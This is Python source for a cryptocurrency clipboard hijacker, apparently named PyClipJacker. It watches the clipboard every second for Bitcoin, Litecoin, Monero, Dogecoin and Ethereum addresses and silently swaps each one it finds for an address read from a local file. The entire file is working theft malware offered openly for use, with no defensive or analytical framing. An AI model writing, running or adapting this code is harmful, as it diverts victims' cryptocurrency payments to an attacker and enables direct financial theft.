import pyperclip as cb
import re
import time

# Crypto address patterns
crypto_patt = {
    "Bitcoin": r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",
    "Litecoin": r"^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$",
    "Monero": r"^[48][0-9a-zA-Z]{94}$",
    "Dogecoin": r"^D[a-km-zA-HJ-NP-Z1-9]{25,34}$",
    "Ethereum": r"^0x[a-fA-F0-9]{40}$"
}

banner = r"""
__________        _________ .__  .__            ____.              __                 
\______   \___.__.\_   ___ \|  | |__|_____     |    |____    ____ |  | __ ___________ 
 |     ___<   |  |/    \  \/|  | |  \____ \    |    \__  \ _/ ___\|  |/ // __ \_  __ \
 |    |    \___  |\     \___|  |_|  |  |_> >\__|    |/ __ \\  \___|    <\  ___/|  | \/
 |____|    / ____| \______  /____/__|   __/\________(____  /\___  >__|_ \\___  >__|   
           \/             \/        |__|                 \/     \/     \/    \/    

                                            Maker: Vaibhav (vibebhavv)
                                            Github: https://github.com/vibebhavv/PyClipJacker/
"""

print(banner)

# Load your own crypto addresses from file
def load_add():
    values = {}
    with open("crypto-address.txt", "r") as f: # File with Crypto address
        for line in f:
            if ":" in line:
                key, val = line.strip().split(":", 1)
                values[key.strip()] = val.strip()
    return values

old_text = None

# Listen clipboard and replace actual address with own address
def listen_cb():
    global old_text
    own_addr = load_add()
    print("[*] Sniffing Crypto Address from clipboard...\n")
    while True:
        addr = cb.paste().strip()
        if addr != old_text:
            for name, pattern in crypto_patt.items():
                if re.fullmatch(pattern, addr):  # Found crypto address
                    if name in own_addr:
                        replacement = own_addr[name]
                        if addr != replacement:   #only replace if different
                            cb.copy(replacement)
                            print(f"[!] {name} address detected: {addr} -> Replaced with: {replacement}")
                        else:
                            print(f"[=] {name} address already replaced: {replacement}")
                        old_text = replacement
                        break
        time.sleep(1)

listen_cb()
